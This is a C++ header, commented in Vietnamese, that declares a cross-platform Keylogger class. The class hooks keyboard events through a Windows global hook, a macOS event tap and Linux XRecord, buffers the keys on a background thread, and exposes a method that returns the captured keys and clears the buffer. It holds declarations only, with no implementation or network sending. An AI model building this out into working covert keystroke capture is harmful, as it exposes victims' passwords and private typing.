#pragma once
#include "FeatureLibrary.h"

#ifdef __APPLE__
#endif

class Keylogger {
private:
    // --- Các biến tĩnh (Static) ---
    // Phải là static vì hàm Hook của Windows là hàm C thuần, 
    // không thể gọi biến thành viên của Class C++ bình thường được.
    
    //static HHOOK _hook;             // "Cái móc" để câu sự kiện bàn phím
    static std::vector<std::string> _buffer;     // Bộ nhớ đệm lưu tạm các phím vừa gõ
    static std::mutex _mtx;         // Cái khóa bảo vệ bộ nhớ đệm
    
    std::thread _workerThread;      // Luồng chạy ngầm của Keylogger
    std::atomic<bool> _isRunning;   // Cờ đánh dấu trạng thái đang chạy hay tắt

    // Hàm phụ để thêm chữ vào bộ đệm an toàn
    static void append(const std::string& str);

    #ifdef _WIN32
        static HHOOK _hook;
        static LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
        void WinLoop();
    #endif

    #ifdef __APPLE__
        CFMachPortRef eventTap = nullptr;
        CFRunLoopSourceRef runLoopSource = nullptr;
        
        static CGEventRef CGEventCallback(CGEventTapProxy proxy, CGEventType type, CGEventRef event, void *refcon);
        void MacLoop(); 
    #endif

    #ifdef __linux__
        Display* ctrlDisplay = nullptr;
        XRecordContext recordContext = 0;
        void LinuxLoop();
    #endif
public:
    Keylogger();
    ~Keylogger();

    // Hàm Callback (Hàm được Windows gọi mỗi khi có phím nhấn)
    //static LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);

    void Start(); // Bắt đầu theo dõi
    void Stop();  // Dừng theo dõi

    // Hàm quan trọng: Lấy dữ liệu ra và xóa sạch bộ đệm cũ
    static std::vector<std::string> getDataAndClear();
};